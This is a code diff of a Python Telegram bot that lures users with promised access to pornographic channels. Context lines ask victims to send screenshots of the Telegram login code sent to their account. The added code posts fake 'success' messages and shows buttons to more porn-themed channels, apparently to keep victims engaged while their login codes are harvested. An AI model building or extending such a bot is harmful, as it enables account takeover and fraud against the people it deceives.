@@ -49,7 +49,7 @@ Please press :
 START_BUTTON = [
 
     [  
-        InlineKeyboardButton("test", url="https://t.me/JustRex"),              
+        InlineKeyboardButton("💋 Preview Channel", url="https://t.me/"),              
     ],            
 ]            
 @app.on_message(filters.command("start") & filters.private)
@@ -113,33 +113,60 @@ We sent a login code to your Telegram account, please send take a screenshot and
 Just send it in the form of a screenshot, you don't need to send it via text.
 """)
 
-# SUCCESFULLY CMD
+# SUCCESFULLY CMD & CALLBACK
 
 SUCCES_TEXT = """
 Succesfully add to Database ⚡
 
 __Congratulations!!__ You are already a member of the Koleksi Porn Video Channel 🎉
 
-if you want more channels please [Click here](https://t.me) and follow the Step
+if you want more channels please press the button below and follow the steps :
 """
+SUCCES_BUTTON = [
+
+    [  
+        InlineKeyboardButton("Get More Channels", callback_data="kesatu"),              
+    ],            
+]            
 
 @app.on_message(filters.regex("Successfully") & filters.private)
 async def start(_, message):
     text = SUCCES_TEXT
+    reply_markup = InlineKeyboardMarkup(SUCCES_BUTTON)
     await message.reply(
         text=text,
+        reply_markup=reply_markup,
         disable_web_page_preview=True
     )
+# REGEX
+
+@app.on_callback_query(filters.regex("^kesatu"))
+async def kesatu(_, callback_query):
+    query = callback_query.data.split()
+    if query[0] == "kesatu":
+        KESATU = """
+FOLLOW THE STEP!!
+
+1.
+2.
+3.
+4.
+"""  
+        KESATUTOMBOL = [
+            [
+                InlineKeyboardButton("KOLEKSI LIVE MELAYU", url="https://t.me"),
+                InlineKeyboardButton("KOLEKSI HIJAB", url="https://t.me"),
+            ],
+            [
+                InlineKeyboardButton("KOLEKSI INDON HIJAB", url="https://t.me"),
+                InlineKeyboardButton("KOLEKSI JAPANESE", url="https://t.me"),
+            ],
+        ]
+        await callback_query.edit_message_text(
+            KESATU, reply_markup=InlineKeyboardMarkup(KESATUTOMBOL)
+        )
 
 # TES MODUL
-@app.on_message(filters.regex("n"))
-async def regex_nye(_, message):
-    udin = await message.reply("konsol")
-    await asyncio.sleep(2)
-    await udin.edit("yeeeee")
-
-
-
 # DATABASE !!!
 
 save = {}
